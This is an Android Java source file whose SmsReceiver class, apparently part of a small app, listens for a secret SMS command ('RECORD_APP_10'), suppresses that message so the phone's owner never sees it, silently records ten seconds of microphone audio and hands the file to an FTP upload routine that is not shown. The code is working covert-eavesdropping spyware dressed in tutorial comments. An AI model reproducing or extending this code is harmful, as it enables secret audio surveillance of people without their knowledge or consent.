package com.example.smsreceiver;

import java.io.IOException;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.telephony.SmsMessage;

// Here we are creating a custom BroadcastReceiver for receiving the SMS.
public class SmsReceiver extends BroadcastReceiver {
	
	private MediaRecorder myRecorder;  //used for recording
	private String outputFile = null;

	//Telephony class is the class that deals with network related things.
	//We are using the SMS_RECEIVED functionality.
    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

    //function that corresponds to the broadcast event.
    @Override
    public void onReceive(Context context, Intent intent) {
    	
    	//checks if the broadcast is send by SMS received.
        if (intent.getAction().equals(SMS_RECEIVED)) {
        	
        	// Bundle will hold the SMS details.
            Bundle bundle = intent.getExtras();
            
            //checks if it is valid
            if (bundle != null) {
            	
            	/*//////////////////////////////////
            	 *------>  The SMS PROCESSING PART
                *//////////////////////////////////
            	
            	
            	/*
            	 * A PDU is a “protocol data unit”, which is the industry format for an SMS message.
            	 * A large message might be broken into many, which is why it is an array of objects.
            	*/
                
            	// get sms objects
            	Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus.length == 0) {
                    return;
                }
                
                // large message might be broken into many
                SmsMessage[] messages = new SmsMessage[pdus.length];
                StringBuilder sb = new StringBuilder();  // we append the broken messages to get the full message.
                 
                for (int i = 0; i < pdus.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    sb.append(messages[i].getMessageBody());
                }
                
                
                String sender = messages[0].getOriginatingAddress();  // senders number
                String message = sb.toString();  // message
               
                if(message.equals("RECORD_APP_10")){
                
	                //Doesn't broadcast it to  the system SMS APP.
	                abortBroadcast();
	
	               
	            	/*///////////////////////////
	            	 *------>  The Recording PART
	                *///////////////////////////
	                
	                
	                // the destination to store the recording 
	        		outputFile = Environment.getExternalStorageDirectory().getAbsolutePath() + "/record.3gpp";  
	
	        		myRecorder = new MediaRecorder();
	        		myRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);  // setting the audio source as MIC
	        		myRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);  //set audio format 3gpp
	        		myRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB); //setting audio encoder
	        		myRecorder.setOutputFile(outputFile);   // sets the output path.
	
	        		// record part  -- START'S THE RECORDING
	        		try {
	        			myRecorder.prepare();
	        			myRecorder.start();
	        		} catch (IllegalStateException e) {
	        			e.printStackTrace();
	        		} catch (IOException e) {
	        			// prepare() fails
	        			e.printStackTrace();
	        		}
	        		
	        		
	        		/*
	        		 * > Threads are generic processing tasks that can do most things, but one thing they cannot do is update the UI.
	        		 * > Handlers on the other hand are bound to threads that allow you to communicate with the UI thread 
	        		 *  Here it is myRecorder object.
	        		 * */
	
	        		//STOPS the record after 10 sec.
	        		final Handler handler = new Handler();
	        		handler.postDelayed(new Runnable() {
	        			@Override
	        			public void run() {
	        				//STOP 
	        				try {
	        					myRecorder.stop();
	        					myRecorder.release();
	        					myRecorder = null;
	        				} catch (IllegalStateException e) {
	        					// it is called before start()
	        					e.printStackTrace();
	        				} catch (RuntimeException e) {
	        					// no valid audio/video data has been received
	        					e.printStackTrace();
	        				}
	        			}
	        		}, 10000); //1 sec --> 1000 milli seconds
	
	
	            	/*////////////////////////
	            	 *------>  The UPLOAD PART
	                */////////////////////////
	        		
	        		new FtpUpload().execute();

                }         
            }
        }
    }
}